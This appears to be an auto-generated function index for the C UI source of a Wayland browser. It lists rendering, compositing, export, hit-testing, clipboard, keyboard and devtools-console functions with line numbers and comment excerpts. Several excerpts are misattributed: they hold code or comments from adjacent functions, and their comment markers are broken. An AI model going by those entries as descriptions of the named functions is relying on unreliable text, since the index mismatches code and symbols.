- `ov_find_box` (line 5351) `static const rc_box *ov_find_box(const rc_layout *L, int bid)` - *static int ov_collect_chain(const rd_doc *doc, int block_id, int *out, int cap) { int tmp[OV_MAX_DEPTH], n = 0; for (int id = block_id; id >= 0 && n < cap; ) { const pv_box_def *d = rd_box_at(doc, (size_t)id); if (d == NULL) break; if (ov_box_clips(d)) tmp[n++] = id; id = d->parent_id; } /* tmp is innermost..outermost; reverse to outermost..innermost for (int i = 0; i < n; ++i) out[i] = tmp[n - 1 - i]; return n; } /* Looks up an rc_box by block_id.*
- `ov_content_rect` (line 5359) `static void ov_content_rect(const rc_box *bx, const pv_box_def *d,
                            do...` - *Computes the padding-box content rect (in page coords: y, x, w, h) for a box. * Used as the clip region for overflow:hidden children.*
- `fragment` (line 5379) `* first fragment (rc_frag.block_id, stamped at flow_emit_frag time) -- using
 * blk->block_id alo...`
- `box_forms_stacking_context` (line 5434) `static int box_forms_stacking_context(const pv_box_def *def)` - *Does this box need its own offscreen compositing group? Single source of truth: the compositor's cx_forms_stacking_context (spec/compositor.md), fed straight from the box's resolved style -- the same predicate box_tree.c already uses to decide Stage-2 paint ORDER now also decides the painter's compositing MECHANISM. * NULL-safe (cx_forms_stacking_context(NULL) is 0).*
- `box_transform_matrix` (line 5463) `static void box_transform_matrix(const pv_box_def *def, double box_x, double box_y,
             ...` - *transform (M1.2 translate; M1.2b adds scale/rotate): builds the box's full 2D affine transform -- translate, then rotate, then scale, pivoted at the box's own center (CSS's initial transform-origin, 50% 50%, the only pivot this engine supports) -- as a Cairo matrix. Identity when the box has no transform, so callers can apply it unconditionally with no visual change for the untransformed common case. box_x/box_y are the box's DEVICE-space top-left (e.g. ox+bx->x, oy+bx->top -- what paint_box_decoration receives). Forward application (cairo_transform around a box's paint calls) lives at the three call sites below; hit-testing (the inverse) is out of scope for * this increment, see include/page_view.h pv_box_def.*
- `bui_blend_operator` (line 5487) `static cairo_operator_t bui_blend_operator(int mix_blend)` - *Maps CSS mix-blend-mode to the Cairo compositing operator used when a box's offscreen group is blended back over its backdrop. Cairo's separable and non-separable blend operators are a 1:1 match for the CSS values (both trace to the same Porter-Duff/W3C Compositing spec); NORMAL/unset is the ordinary OVER * operator every other paint call in this file already uses implicitly.*
- `bui_pop_group_composite` (line 5509) `static void bui_pop_group_composite(cairo_t *cr, const pv_box_def *def)` - *Composites the currently-pushed group back onto cr using def's opacity/mix-blend (the group must already be open via cairo_push_group). Restores CAIRO_OPERATOR_OVER * afterwards so callers never leak a non-default operator into later paint calls.*
- `limits` (line 5523) `* documents narrower v1 limits (no overflow:hidden, no negative z-index). A box
 * grouped this w...`
- `paint_box_and_direct_rows` (line 5560) `static void paint_box_and_direct_rows(cairo_t *cr, browser_window *w, const rc_layout *L,
       ...` - *(blk->block_id match), together, when the box forms a stacking context -- so a translucent/blended box's background and its text row(s) fade or blend as ONE coherent unit. Grouping decoration alone is not enough: a row's own background fill (paint_content_row's r->bg_rgb branch) cascades the SAME author background-color as the box, but paints in the caller's separate row pass -- left ungrouped, it shows as a solid, un-faded rectangle sitting on top of an otherwise-correctly-translucent box, which looks more broken than doing nothing. Consumed rows are marked in row_done (indexed like L->rows) so the caller's row loop skips them. Glyph color still uses the pre-existing pv_run.opacity/set_rgb_alpha path (untouched, already correct); this only adds the row BACKGROUND and the box's own decoration to the group. Ungrouped boxes are unchanged: paint_box_decoration only, rows stay in the normal row loop. Does not recurse into nested child boxes/their rows -- a full nested layer tree * is out of scope, see spec/compositor.md.*
- `paint_positioned_one` (line 5629) `static void paint_positioned_one(cairo_t *cr, browser_window *w, const ui_theme *th,
            ...` - *Group compositing (M1.1 increments 3-4): a box that forms a CSS stacking context (box_forms_stacking_context: opacity<1, mix-blend != normal, isolation:isolate, transform != none, or the position+z-index triggers cx_forms_stacking_context already needed for paint ORDER) is composited as ONE unit -- its decoration and content blended together first, then the whole result faded/blended -- not each piece faded independently (naive per-draw alpha double-blends wherever e.g. background and content overlap). cairo_push_group redirects the box's paint calls to a fresh offscreen surface (bounded by the current clip, so this is exactly the "layer" spec/compositor.md describes); bui_pop_group_composite blends that surface back with the box's opacity and mix-blend-mode. box_transform_matrix (M1.2 translate; M1.2b scale/rotate) shifts where decoration/content PAINT -- the box's stored rect used for hit-testing is * untouched, see include/page_view.h.*
- `paint_structured` (line 5714) `static void paint_structured(cairo_t *cr, browser_window *w, double content_top,
                ...`
- `write_doc_pdf` (line 5821) `static long write_doc_pdf(browser_window *w, const char *path)` - *Writes the window's current laid-out document to a vector PDF at `path`, paginated to US Letter. Returns the page count (0 when the document lays out to nothing), or -1 on a Cairo error. The page is laid out and coloured in a forced light theme so the print is dark-on-white; the live theme is restored before return. No window/Wayland state is touched -- only w->doc and w->theme are read, through the same layout_doc / paint_content_row the screen uses -- so the GUI * "Save as PDF" and the headless --download-pdf path render identically.*
- `export_pdf` (line 5913) `static void export_pdf(browser_window *w)`
- `write_doc_png` (line 5965) `static long write_doc_png(browser_window *w, const char *path)` - *Writes the window's current laid-out document to a single full-height PNG at `path` (the same layout/paint path as the screen and the PDF export, in a forced light theme so it is dark-on-white). Returns the image height in px (0 when the document lays out to nothing), or -1 on a Cairo error. No Wayland state is * touched -- only w->doc and w->theme are read.*
- `export_png` (line 6060) `static void export_png(browser_window *w)`
- `caller` (line 6095) `* caller (freedom.c --download-pdf) owns the fetch/parse pipeline and supplies the
 * out_path ve...`
- `ui_render_png` (line 6118) `ui_status ui_render_png(const rd_doc *doc, const char *out_path, long *out_h)` - *Headless PNG export (no Wayland; see include/ui.h). One full-height bitmap of the whole page, the cheapest artifact for visual review (no PDF rasterise step). Same * zeroed-window setup as ui_render_pdf.*
- `render_doc_images` (line 6144) `static ui_status render_doc_images(const rd_doc *doc, tab *t, const char *top_url,
              ...` - *Headless PNG/PDF export WITH image decoding (see include/ui.h). Unlike the plain ui_render_png/pdf (which always draw placeholders), these decode the page's allowed images through the still-open confined worker `t` -- the hostile image bytes never touch this process -- exactly as the on-screen window does. Remote image bytes come from `img_fetch` (the caller's policy-applying fetcher, e.g. headless_fetch); local file:// images are read from disk (confined to the document directory by render_doc). top_url is the page origin (https or file://); a NULL origin loads no images. Any image that fails falls back to its placeholder, byte-identical to the window path. The zeroed window mirrors ui_render_png; cur_top drives the local-vs-remote branch in * load_images and is released before returning.*
- `ui_render_png_images` (line 6168) `ui_status ui_render_png_images(const rd_doc *doc, tab *t, const char *top_url,
                  ...`
- `ui_render_pdf_images` (line 6174) `ui_status ui_render_pdf_images(const rd_doc *doc, tab *t, const char *top_url,
                  ...`
- `ui_dump_layout` (line 6190) `ui_status ui_dump_layout(const rd_doc *doc)` - *Headless layout dump: runs the same layout_doc + position_doc pass as the on-screen/PNG renderer and prints the resolved box geometry (in-flow boxes and out-of-flow positioned boxes) to stdout as agent-readable text. This is the layout-side counterpart to --dump-dom (which prints the pre-layout render tree): it makes the EFFECT of the layout engine verifiable without a display or a rasterised image (CI, an AI agent) — the Stacking/positioning bugs that a PNG would reveal are inspectable as plain numbers. See `--dump-layout` in spec/freedom.md. Pure I/O on already-resolved, already-fuzzed data; no socket, * no file, no mutation of the doc.*
- `link_at_point` (line 6242) `static const char *link_at_point(browser_window *w, double px, double py)`
- `resolve_box_cursor` (line 6336) `static int resolve_box_cursor(const rd_doc *doc, int block_id)` - *First non-unset author `cursor` on block_id's box or an ancestor (nearest wins, like the rest of the box-decoration fields), or CSS_CUR_UNSET if none set the property or block_id < 0. Bounded by the box-def parent chain (RC_BOX_STACK_MAX, * same cap as every other box-path walk here).*
- `box_pointer_events_none` (line 6350) `static int box_pointer_events_none(const rd_doc *doc, int block_id)` - *True when author `pointer-events: none` removes block_id's content from hit-testing (2026-07-10): the nearest box in the parent chain that sets the property wins, exactly like resolve_box_cursor. The box tree only exists with * caps.css, so the default render hit-tests everything (byte-identical).*
- `cursor_at_point` (line 6366) `static int cursor_at_point(browser_window *w, double px, double py)` - *Returns the resolved author `cursor` (css_cursor) at (px, py), or CSS_CUR_UNSET when outside content / no box sets one. Unlike link_at_point this tests EVERY fragment (not just linked ones): cursor:pointer commonly styles a non-link clickable element (a JS-driven button/div). A separate layout+hit-test walk from link_at_point/node_at_point (matching this file's existing per-purpose hit-test * style); update_hover calls all it needs once per pointer-motion event.*
- `node_at_point` (line 6418) `static dom_node_id node_at_point(browser_window *w, double px, double py)` - *Returns the DOM node id of the element under (px, py), or DOM_NODE_NONE if the point is over blank space / outside content. Mirrors layout and scroll clamping * exactly so the hit matches the painted frame.*
- `reference` (line 6466) `* reference (downgrade, foreign scheme, no resolvable base) navigates nowhere:
 * hostile content...`
- `apply_click_result` (line 6487) `static void apply_click_result(browser_window *w, tab_page *page)` - *Applies a click result returned by the worker: rebuild the rendered document and refresh inputs/console, but keep the current page in history (a click is not a navigation). Images are not re-fetched: a click handler may add text, but v1 does * not introduce new remote images.*
- `memory` (line 6510) `* memory (the href pointer, not its contents, was all the old code preserved). */
static void dis...`
- `GET` (line 6589) `* the network under weaker rules than a GET (Zero Trust). */
static void do_submit_post(browser_w...`
- `ensure_download_dir` (line 6623) `static int ensure_download_dir(char *out, size_t outsz)` - *Builds ~/Downloads/freedom into out and creates both levels (best effort; an existing directory is fine). Returns 1 on success. Falls back to $HOME or "." * for the base, matching export_pdf's directory choice.*
- `write_file_atomic` (line 6638) `static int write_file_atomic(const char *path, const void *bytes, size_t len)` - *Writes len bytes to path with 0600 perms via a temp file + atomic rename (the disk_store convention): a crash mid-write never leaves a half file at path, and * a download is never world-readable. Returns 1 on success.*
- `save_download` (line 6660) `static void save_download(browser_window *w, const char *url, const char *bytes,
                ...` - *Saves a fetched resource to ~/Downloads/freedom instead of rendering it. The filename is derived fail-closed from the hostile Content-Disposition / URL * (download module); the body is size-capped. The current page stays on screen.*
- `save_current_page` (line 6693) `static void save_current_page(browser_window *w)` - *Ctrl+S: save the current page's cached source to ~/Downloads/freedom. No network * round-trip -- the bytes already in the page cache are written.*
- `deliver_fetch_result` (line 6702) `static void deliver_fetch_result(browser_window *w, fetch_job *j)`
- `drain_fetch_results` (line 6757) `static void drain_fetch_results(browser_window *w)` - *Drains every completed fetch the worker threads have posted (the read end is non-blocking; pointer-sized writes are atomic). Called when the loop sees the * fetch pipe readable.*
- `toggle_reader` (line 6833) `static void toggle_reader(browser_window *w)` - *Toggles distraction-free (reader) mode and re-renders from cache (no network): the worker drops boilerplate, author styling/images are gated off, and the content * is centered in a reading column. Shared by the menu item and the Ctrl+D shortcut.*
- `menu_item_checked` (line 6844) `static int menu_item_checked(const browser_window *w, size_t i)` - *Toggles distraction-free (reader) mode and re-renders from cache (no network): the worker drops boilerplate, author styling/images are gated off, and the content * is centered in a reading column. Shared by the menu item and the Ctrl+D shortcut. static void toggle_reader(browser_window *w) { w->reader = !w->reader; apply_theme(w); /* recompute the reading-column margin for the new state browser_set_status(&w->bs, w->reader ? "Distraction-free mode ON (boilerplate and author styles hidden)." : "Distraction-free mode OFF.", now_ms()); profile_sync(w); render_current(w); } /* True when options-menu item i is currently enabled (drives its checkmark).*
- `menu_item_toggle` (line 6866) `static void menu_item_toggle(browser_window *w, size_t i)` - *Toggles options-menu item i and applies its effect. Theme and force-colors only affect presentation (a repaint, which re-runs layout, suffices); a capability * change re-renders from cache.*
- `draw_clock` (line 6976) `static void draw_clock(cairo_t *cr, ui_rgb color, double cx, double cy, double r,
               ...` - *A small spinner meaning "busy". Now that the fetch runs off the event-loop thread, the loop ticks ~12 fps while loading and rotates a leading arc so the user sees real * progress. phase in [0,1) is the rotation, derived from the wall clock.*
- `draw_hamburger` (line 6987) `static void draw_hamburger(cairo_t *cr, ui_rgb color, double bx, double ttop)`
- `draw_reload` (line 7004) `static void draw_reload(cairo_t *cr, ui_rgb color, double bx, double ttop)` - *The reload button glyph: a ~300-degree circular arrow centred in a UI_BTN_W button starting at bx. Drawn with Cairo (not a font glyph) so it never depends on the * chrome face having a reload codepoint.*
- `draw_menu` (line 7026) `static void draw_menu(cairo_t *cr, browser_window *w)` - *double a1 = a0 + UI_TWO_PI * 0.82;      /* leave a gap for the arrowhead cairo_new_sub_path(cr); cairo_arc(cr, cx, cy, r, a0, a1); cairo_stroke(cr); /* Arrowhead at the arc's start (top), pointing clockwise. double hx = cx + r * cos(a0), hy = cy + r * sin(a0); cairo_move_to(cr, hx, hy); cairo_line_to(cr, hx - 4.0, hy - 1.0); cairo_move_to(cr, hx, hy); cairo_line_to(cr, hx + 1.0, hy - 4.5); cairo_stroke(cr); } /* Draws the options-menu panel (checkbox per capability) when open.*
- `draw_hover_url` (line 7137) `static double draw_hover_url(cairo_t *cr, browser_window *w)` - *Persistent bottom strip showing the target of the link under the pointer, so the user always knows where a click will go. Returns the strip height (0 when * nothing is hovered) so the toast can stack above it.*
- `draw_toast` (line 7169) `static void draw_toast(cairo_t *cr, browser_window *w, double bottom_offset)` - *Draws the transient status toast (a banner near the bottom of the window), * raised by bottom_offset so it stacks above the hover-URL strip when both show.*
- `draw_tabstrip` (line 7199) `static void draw_tabstrip(cairo_t *cr, browser_window *w)` - *Paints the tab strip: one cell per tab (the active one connected to the content background, the rest dimmed), each with its clipped title and a close 'x', then a trailing '+' to open a new tab. The geometry mirrors the pointer hit-test (tab_width/newtab_x) so a click lands on exactly what is drawn. Uses the chrome * (monospace) font already selected by paint().*
- `draw_omnibox` (line 7254) `static void draw_omnibox(cairo_t *cr, browser_window *w)` - *Omnibox autocomplete dropdown: a panel of favorite-host suggestions below the URL bar, drawn as an overlay (on top of content) while the URL bar is focused and a * query matches. The highlighted row (omni_sel) is shaded.*
- `paint` (line 7287) `static void paint(browser_window *w)`
- `redraw` (line 7528) `static void redraw(browser_window *w)`
- `wm_base_ping` (line 7539) `static void wm_base_ping(void *data, struct xdg_wm_base *b, uint32_t serial)` - *cairo_surface_flush(w->cairo_surface); cairo_destroy(cr); } static void redraw(browser_window *w) { if (!w->configured) return; if (ensure_buffer(w) != 0) return; paint(w); wl_surface_attach(w->surface, w->buffer, 0, 0); wl_surface_damage_buffer(w->surface, 0, 0, w->width, w->height); wl_surface_commit(w->surface); } /* --- xdg-shell ---*
- `xdg_surface_configure` (line 7545) `static void xdg_surface_configure(void *data, struct xdg_surface *s, uint32_t serial)`
- `toplevel_configure` (line 7553) `static void toplevel_configure(void *data, struct xdg_toplevel *t,
                              ...`
- `wl_array_for_each` (line 7569) `wl_array_for_each(st, states)`
- `toplevel_close` (line 7574) `static void toplevel_close(void *data, struct xdg_toplevel *t)`
- `deco_configure` (line 7582) `static void deco_configure(void *data, struct zxdg_toplevel_decoration_v1 *d, uint32_t mode)`
- `set_cursor` (line 7596) `static void set_cursor(browser_window *w, int hand)` - *Applies the hand (over a link) or default arrow cursor for the current pointer enter serial. A no-op when no themed cursor is available (the compositor keeps * its own default).*
- `update_hover` (line 7618) `static void update_hover(browser_window *w)` - *Recomputes which link (if any) is under the pointer; on a change, updates the cursor shape and repaints so the hover highlight follows. The author `cursor` (css_cursor) at the point is folded into the hand-vs-arrow decision: a cursor:pointer element (a JS-driven button/div, not just an <a>) shows the hand even without an href. v1 only distinguishes pointer from everything else (the rest of the keyword set resolves for completeness/debug_dom but still paints as the default arrow -- see spec/css.md); overriding a LINK's hand cursor away * (e.g. `a{cursor:default}`) is a known v1 gap.*
- `fbw_split_y` (line 7678) `static double fbw_split_y(const freebug_window *fb)` - *struct wl_buffer *buffer; void  *shm_data; size_t shm_size; cairo_surface_t *cairo_surface; double split;          /* log-pane fraction of the body height double scroll;         /* log scroll offset (px) int    dragging_split; /* the divider is being dragged int    hover_copy;     /* mouse is over the copy button int    copy_status;    /* 0=idle, 1=no-clipboard(red), 2=OK(green) uint64_t copy_ts;      /* last copy timestamp (ms), for "Copied!" feedback tf_field editor;       /* the JS REPL input (newlines allowed) }; /* y of the divider between the log pane and the editor.*
- `freebug_ensure_buffer` (line 7686) `static int freebug_ensure_buffer(freebug_window *fb)`
- `fbw_level_rgb` (line 7714) `static void fbw_level_rgb(int level, double *r, double *g, double *b)` - *struct wl_shm_pool *pool = wl_shm_create_pool(fb->owner->shm, fd, (int32_t)size); fb->buffer = wl_shm_pool_create_buffer(pool, 0, fb->width, fb->height, stride, WL_SHM_FORMAT_ARGB8888); wl_shm_pool_destroy(pool); close(fd); if (fb->buffer == NULL) { munmap(data, size); return -1; } wl_buffer_add_listener(fb->buffer, &buffer_listener, fb); /* release is a no-op fb->shm_data = data; fb->shm_size = size; fb->cairo_surface = cairo_image_surface_create_for_data( (unsigned char *)data, CAIRO_FORMAT_ARGB32, fb->width, fb->height, stride); return (cairo_surface_status(fb->cairo_surface) == CAIRO_STATUS_SUCCESS) ? 0 : -1; } /* Color for a console level (dark devtools palette).*
- `fbw_console_lines` (line 7725) `static size_t fbw_console_lines(const fb_buffer *log)` - *} /* Color for a console level (dark devtools palette). static void fbw_level_rgb(int level, double *r, double *g, double *b) { switch (level) { case FB_ERROR: *r = 0.95; *g = 0.36; *b = 0.36; break; case FB_WARN:  *r = 0.93; *g = 0.78; *b = 0.36; break; case FB_INFO:  *r = 0.46; *g = 0.80; *b = 0.95; break; case FB_DEBUG: *r = 0.60; *g = 0.60; *b = 0.66; break; default:       *r = 0.86; *g = 0.88; *b = 0.91; break; /* log } } /* Counts the visual lines a console buffer occupies (entries split on '\n').*
- `freebug_paint` (line 7737) `static void freebug_paint(freebug_window *fb)`
- `freebug_redraw_fb` (line 7936) `static void freebug_redraw_fb(freebug_window *fb)`
- `freebug_redraw` (line 7945) `static void freebug_redraw(browser_window *w)`
- `freebug_hide` (line 7949) `static void freebug_hide(browser_window *w)`
- `fbw_xdg_surface_configure` (line 7965) `static void fbw_xdg_surface_configure(void *data, struct xdg_surface *s, uint32_t serial)`
- `fbw_toplevel_configure` (line 7973) `static void fbw_toplevel_configure(void *data, struct xdg_toplevel *t,
                          ...`
- `fbw_toplevel_close` (line 7983) `static void fbw_toplevel_close(void *data, struct xdg_toplevel *t)`
- `freebug_show` (line 7992) `static void freebug_show(browser_window *w)`
- `freebug_toggle` (line 8022) `static void freebug_toggle(browser_window *w)`
- `freebug_destroy` (line 8027) `static void freebug_destroy(browser_window *w)`
- `freebug_owns_surface` (line 8034) `static int freebug_owns_surface(const browser_window *w, const struct wl_surface *sf)`
- `freebug_is_open` (line 8038) `static int freebug_is_open(const browser_window *w)`
- `freebug_repl_worker` (line 8046) `static tab *freebug_repl_worker(browser_window *w)` - *Returns the live page worker for the REPL, lazily (re)opening one bound to the active page's cache if none is kept alive (e.g. just after a tab switch). NULL if * there is no page to bind to.*
- `freebug_eval` (line 8081) `static void freebug_eval(browser_window *w)`
- `freebug_handle_key` (line 8121) `static void freebug_handle_key(browser_window *w, xkb_keysym_t sym,
                             ...`
- `freebug_pointer_button` (line 8156) `static void freebug_pointer_button(browser_window *w, uint32_t serial,
                          ...`
- `freebug_pointer_motion` (line 8175) `static void freebug_pointer_motion(browser_window *w)`
- `freebug_pointer_axis` (line 8197) `static void freebug_pointer_axis(browser_window *w, wl_fixed_t value)`
- `ptr_enter` (line 8215) `static void ptr_enter(void *d, struct wl_pointer *p, uint32_t s,
                      struct wl_...`
- `ptr_leave` (line 8234) `static void ptr_leave(void *d, struct wl_pointer *p, uint32_t s, struct wl_surface *sf)`
- `ptr_motion` (line 8251) `static void ptr_motion(void *d, struct wl_pointer *p, uint32_t t, wl_fixed_t x, wl_fixed_t y)`
- `load_current` (line 8275) `static void load_current(browser_window *w)`
- `go_omnibox` (line 8289) `static void go_omnibox(browser_window *w)` - *Commits the URL bar like a real omnibox: an existing local file is opened as before; otherwise url_omnibox (pure) decides between navigating to a site and running a DuckDuckGo HTML search, building the absolute https URL either way. So "example.com" becomes https://example.com and "best linux distro" becomes a * search, instead of the old "cannot read file" dead end.*
- `ptr_button` (line 8333) `static void ptr_button(void *d, struct wl_pointer *p, uint32_t serial, uint32_t t,
              ...`
- `scroll_line_px` (line 8563) `static double scroll_line_px(const browser_window *w)` - *} } /* PV_IN_BUTTON (reset/generic) is inert in v1. } else { /* Clicking non-input: dispatch blur on old if any. if (old_nid != DOM_NODE_NONE) dispatch_js_event(w, old_nid, "blur", NULL, 0, NULL); dispatch_click(w, w->ptr_x, w->ptr_y); } } redraw(w); } /* One body line of scroll, in pixels (the common step unit).*
- `ptr_axis` (line 8566) `static void ptr_axis(void *data, struct wl_pointer *p, uint32_t time,
                     uint32...`
- `ptr_frame` (line 8590) `static void ptr_frame(void *d, struct wl_pointer *p)`
- `mime_is_text` (line 8607) `static int mime_is_text(const char *mime)` - *} static const struct wl_pointer_listener pointer_listener = { .enter = ptr_enter, .leave = ptr_leave, .motion = ptr_motion, .button = ptr_button, .axis = ptr_axis, .frame = ptr_frame, }; /* --- clipboard (wl_data_device) --- /* True for a mime type that carries plain UTF-8/Latin text we can paste.*
- `data_offer_source_actions` (line 8625) `static void data_offer_source_actions(void *d, struct wl_data_offer *o, uint32_t a)`
- `data_offer_action` (line 8628) `static void data_offer_action(void *d, struct wl_data_offer *o, uint32_t a)`
- `data_device_data_offer` (line 8638) `static void data_device_data_offer(void *data, struct wl_data_device *dev,
                      ...` - *} static void data_offer_source_actions(void *d, struct wl_data_offer *o, uint32_t a) { (void)d; (void)o; (void)a; } static void data_offer_action(void *d, struct wl_data_offer *o, uint32_t a) { (void)d; (void)o; (void)a; } static const struct wl_data_offer_listener data_offer_listener = { .offer = data_offer_mime, .source_actions = data_offer_source_actions, .action = data_offer_action, }; /* A new offer is being introduced: start scanning its mime types.*
- `data_device_selection` (line 8650) `static void data_device_selection(void *data, struct wl_data_device *dev,
                       ...` - *The clipboard selection changed. Commit the new offer (or NULL when the clipboard * was cleared), destroying any previous one we held.*
- `data_device_enter` (line 8669) `static void data_device_enter(void *d, struct wl_data_device *dev, uint32_t serial,
             ...` - *wl_data_offer_destroy(w->selection_offer); if (offer == NULL) { w->selection_offer = NULL; w->selection_offer_has_text = 0; w->sel_mime[0] = '\0'; return; } w->selection_offer = offer; w->selection_offer_has_text = (offer == w->incoming_offer) ? w->incoming_offer_has_text : 0; snprintf(w->sel_mime, sizeof w->sel_mime, "%s", (offer == w->incoming_offer && w->incoming_mime[0]) ? w->incoming_mime : "text/plain"); } /* Drag-and-drop events: not supported (the data device is clipboard-only).*
- `data_device_leave` (line 8674) `static void data_device_leave(void *d, struct wl_data_device *dev)`
- `data_device_motion` (line 8675) `static void data_device_motion(void *d, struct wl_data_device *dev, uint32_t t,
                 ...`
- `data_device_drop` (line 8679) `static void data_device_drop(void *d, struct wl_data_device *dev)`
- `data_source_cancelled` (line 8690) `static void data_source_cancelled(void *data, struct wl_data_source *src)` - *wl_fixed_t x, wl_fixed_t y) { (void)d; (void)dev; (void)t; (void)x; (void)y; } static void data_device_drop(void *d, struct wl_data_device *dev) { (void)d; (void)dev; } static const struct wl_data_device_listener data_device_listener = { .data_offer = data_device_data_offer, .enter = data_device_enter, .leave = data_device_leave, .motion = data_device_motion, .drop = data_device_drop, .selection = data_device_selection, }; /* Another client now owns our copied text: drop our source.*
- `data_source_send` (line 8696) `static void data_source_send(void *data, struct wl_data_source *src,
                            ...` - *.enter = data_device_enter, .leave = data_device_leave, .motion = data_device_motion, .drop = data_device_drop, .selection = data_device_selection, }; /* Another client now owns our copied text: drop our source. static void data_source_cancelled(void *data, struct wl_data_source *src) { browser_window *w = (browser_window *)data; if (src == w->copy_source) w->copy_source = NULL; wl_data_source_destroy(src); } /* A paster asked for our copied text: write it to the pipe and close.*
- `data_source_target` (line 8709) `static void data_source_target(void *d, struct wl_data_source *s, const char *m)`
- `freebug_copy_console` (line 8721) `static void freebug_copy_console(browser_window *w)` - *Formats the entire Freebug console buffer and places it on the Wayland clipboard, so the user can paste the developer console output elsewhere. The format matches * print_console in freedom.c. Called from the Copy button in the Freebug header.*
- `insert_pasted_text` (line 8779) `static void insert_pasted_text(browser_window *w, const char *text, size_t len)` - *Inserts pasted bytes into whichever text target currently has focus (page input, User-Agent box, or the URL bar). Control bytes -- including embedded CR/LF/TAB that a multi-line clipboard would carry -- are dropped so a paste cannot inject a newline * into a single-line field; UTF-8 continuation bytes (>= 0x80) pass through.*
- `clipboard_copy` (line 8843) `static void clipboard_copy(browser_window *w)` - *Ctrl+C: copy the focused field's text (or, with nothing focused, the page address) * to the clipboard by owning a wl_data_source that serves it on demand.*
- `keyboard_keymap` (line 8890) `static void keyboard_keymap(void *data, struct wl_keyboard *kbd,
                            uint...` - *Cut the omnibar selection: copy it to the clipboard, then remove it. v1 cut is the * URL bar only (page inputs / the UA box have no selection model yet). static void clipboard_cut(browser_window *w) { if (!w->url_bar_focused) return; if (!browser_url_bar_selection(&w->bs, NULL, NULL)) return; clipboard_copy(w);                       /* copies just the selection browser_url_bar_delete_selection(&w->bs); } /* --- keyboard with xkbcommon ---*
- `keyboard_enter` (line 8911) `static void keyboard_enter(void *d, struct wl_keyboard *kbd, uint32_t s,
                        ...`
- `keyboard_leave` (line 8919) `static void keyboard_leave(void *d, struct wl_keyboard *kbd, uint32_t s, struct wl_surface *sf)`
- `key_sym_to_js_key` (line 8927) `static const char *key_sym_to_js_key(xkb_keysym_t sym)` - *Maps an xkb keysym to a JS event.key string. Returns NULL for printable chars * (the utf8 bytes should be used as the key).*
- `key_sym_to_keycode` (line 8953) `static int key_sym_to_keycode(xkb_keysym_t sym)` - *Maps an xkb keysym to a JS keyCode number. For printable ASCII, returns the * ASCII value; for special keys, returns the standard JS keyCode.*
- `dispatch_js_event` (line 8978) `static void dispatch_js_event(browser_window *w, dom_node_id node_id,
                           ...` - *Dispatches a JS DOM event to the worker for the given node_id. The worker returns a re-derived view which is applied via apply_click_result. Since that replaces w->doc and rebuilds w->inputs, focus is cleared before the call and restored afterward if the input still exists. The text value is saved before * dispatch and restored after, so live typed content is not lost.*
- `handle_key_press` (line 9035) `static void handle_key_press(browser_window *w, xkb_keysym_t sym, const char *utf8,
             ...` - *Performs the effect of a single key press. Factored out of keyboard_key so a held key can be re-fired from the repeat timer with the exact same semantics (the caller * recomputes sym/utf8/modifiers from the live xkb_state each time).*
- `key_is_repeatable` (line 9348) `static int key_is_repeatable(xkb_keysym_t sym, int n, int ctrl)` - *Keys whose held-down auto-repeat is safe and useful: text editing, cursor motion and scrolling. A Ctrl chord (tab spawn, reload, image toggle...) or Enter must NOT repeat -- holding them would loop a navigation or spawn tabs. A printable character * (n > 0) repeats so a held letter types, mirroring every text widget.*
- `key_repeat_arm` (line 9364) `static void key_repeat_arm(browser_window *w, uint32_t key)` - *Arms the repeat timer for key: first fire after repeat_delay ms, then every * 1/repeat_rate s. A held key thus repeats until released (key_repeat_stop).*
- `key_repeat_stop` (line 9377) `static void key_repeat_stop(browser_window *w)` - *1/repeat_rate s. A held key thus repeats until released (key_repeat_stop). static void key_repeat_arm(browser_window *w, uint32_t key) { if (w->repeat_timer_fd < 0 || w->repeat_rate <= 0) return; w->repeat_key = key; long interval_ns = 1000000000L / w->repeat_rate; struct itimerspec its; its.it_value.tv_sec  = w->repeat_delay / 1000; its.it_value.tv_nsec = (long)(w->repeat_delay % 1000) * 1000000L; its.it_interval.tv_sec  = interval_ns / 1000000000L; its.it_interval.tv_nsec = interval_ns % 1000000000L; timerfd_settime(w->repeat_timer_fd, 0, &its, NULL); } /* Disarms repeat (key released, or a non-repeatable key was pressed).*
- `key_repeat_fire` (line 9388) `static void key_repeat_fire(browser_window *w)` - *Re-fires the currently held key. Called from the event loop when the timer expires. Modifiers/keysym are recomputed from the live xkb_state, so a chord released * mid-repeat degrades correctly.*
- `keyboard_key` (line 9401) `static void keyboard_key(void *data, struct wl_keyboard *kbd, uint32_t serial,
                  ...`
- `keyboard_modifiers` (line 9441) `static void keyboard_modifiers(void *data, struct wl_keyboard *kbd, uint32_t s,
                 ...`
- `keyboard_repeat_info` (line 9451) `static void keyboard_repeat_info(void *d, struct wl_keyboard *kbd, int32_t rate, int32_t delay)`
- `seat_caps` (line 9469) `static void seat_caps(void *data, struct wl_seat *seat, uint32_t caps)` - *w->repeat_rate = rate; w->repeat_delay = delay; } static const struct wl_keyboard_listener keyboard_listener = { .keymap = keyboard_keymap, .enter = keyboard_enter, .leave = keyboard_leave, .key = keyboard_key, .modifiers = keyboard_modifiers, .repeat_info = keyboard_repeat_info, }; /* --- seat ---*
- `seat_name` (line 9481) `static void seat_name(void *d, struct wl_seat *s, const char *name)`
- `registry_global` (line 9487) `static void registry_global(void *data, struct wl_registry *reg, uint32_t name,
                 ...` - *w->pointer = wl_seat_get_pointer(seat); wl_pointer_add_listener(w->pointer, &pointer_listener, w); } if ((caps & WL_SEAT_CAPABILITY_KEYBOARD) && w->keyboard == NULL) { w->keyboard = wl_seat_get_keyboard(seat); wl_keyboard_add_listener(w->keyboard, &keyboard_listener, w); } } static void seat_name(void *d, struct wl_seat *s, const char *name) { (void)d; (void)s; (void)name; } static const struct wl_seat_listener seat_listener = { seat_caps, seat_name }; /* --- registry ---*
- `registry_remove` (line 9508) `static void registry_remove(void *d, struct wl_registry *r, uint32_t name)`
- `ui_run_browser` (line 9517) `ui_status ui_run_browser(const char *start_url)` - *w->data_device_manager = wl_registry_bind(reg, name, &wl_data_device_manager_interface, 1); } else if (strcmp(iface, zxdg_decoration_manager_v1_interface.name) == 0) { w->deco_mgr = wl_registry_bind(reg, name, &zxdg_decoration_manager_v1_interface, 1); } } static void registry_remove(void *d, struct wl_registry *r, uint32_t name) { (void)d; (void)r; (void)name; } static const struct wl_registry_listener registry_listener = { .global = registry_global, .global_remove = registry_remove, }; /* --- public API ---*

**Macros:**
- `_GNU_SOURCE` (line 11)
- `UI_TOOLBAR_H` (line 74)
- `UI_TITLEBAR_H` (line 76)
- `UI_TABBAR_H` (line 77)
- `UI_TAB_MIN_W` (line 78)
